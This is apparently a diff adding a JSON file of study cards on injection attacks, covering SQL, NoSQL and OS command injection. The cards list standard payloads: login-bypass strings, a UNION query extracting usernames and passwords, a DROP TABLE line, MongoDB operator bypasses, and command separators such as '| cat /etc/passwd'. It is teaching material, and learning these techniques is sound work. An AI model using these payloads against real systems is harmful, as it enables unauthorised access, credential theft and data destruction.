@@ -1,0 +1,62 @@
+{
+  "chapter_title": "Injection Attacks",
+  "cards": [
+    {
+      "title": "SQL Injection (SQLi)",
+      "description_short": "Inject malicious SQL queries",
+      "description_long": "SQL Injection occurs when an attacker inserts malicious SQL code into input fields that interact with a database. This allows attackers to manipulate database queries to read, modify, or delete sensitive data.",
+      "main_commands": [
+        {"command":"' OR '1'='1", "explanation":"Classic authentication bypass payload"},
+        {"command":"' OR 1=1 --", "explanation":"Makes the SQL query always true"},
+        {"command":"' UNION SELECT username, password FROM users --", "explanation":"Extract data from another table"},
+        {"command":"' DROP TABLE users; --", "explanation":"Attempt to delete a database table"},
+        {"command":"' AND 1=2 --", "explanation":"Used to test if injection is possible"}
+      ],
+      "activity": [
+        "Identify vulnerable login forms",
+        "Test basic authentication bypass payload",
+        "Use UNION queries to extract data",
+        "Understand how SQL comments work in payloads",
+        "Observe how input validation prevents injection"
+      ]
+    },
+    {
+      "title": "NoSQL Injection (NoSQLi)",
+      "description_short": "Exploit NoSQL database queries",
+      "description_long": "NoSQL Injection targets databases like MongoDB, CouchDB, and Firebase. Attackers manipulate query objects or JSON input to bypass authentication or retrieve unauthorized data.",
+      "main_commands": [
+        {"command":"{ \"$ne\": null }", "explanation":"Matches any value not equal to null"},
+        {"command":"{ \"$gt\": \"\" }", "explanation":"Matches values greater than empty string"},
+        {"command":"{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}", "explanation":"Authentication bypass example"},
+        {"command":"{\"$or\": [{\"username\": \"admin\"}, {\"password\": {\"$ne\": null}}]}", "explanation":"Manipulate logical operators"},
+        {"command":"{\"$regex\": \".*\"}", "explanation":"Regex wildcard match"}
+      ],
+      "activity": [
+        "Test login bypass using $ne operator",
+        "Experiment with logical operators like $or",
+        "Observe query behavior with JSON injection",
+        "Try regex-based queries",
+        "Understand how input sanitization prevents NoSQLi"
+      ]
+    },
+    {
+      "title": "OS Command Injection",
+      "description_short": "Execute system commands via input",
+      "description_long": "OS Command Injection occurs when user input is passed to system shell commands without proper sanitization. Attackers can execute arbitrary commands on the host operating system.",
+      "main_commands": [
+        {"command":"; ls", "explanation":"Append command to list files"},
+        {"command":"&& whoami", "explanation":"Execute command if previous succeeds"},
+        {"command":"| cat /etc/passwd", "explanation":"Pipe output to another command"},
+        {"command":"; uname -a", "explanation":"Display system information"},
+        {"command":"`id`", "explanation":"Execute command inside backticks"}
+      ],
+      "activity": [
+        "Test command chaining with ;",
+        "Check system user using whoami",
+        "View system information using uname",
+        "Understand how command separators work",
+        "Learn how input validation prevents command injection"
+      ]
+    }
+  ]
+}
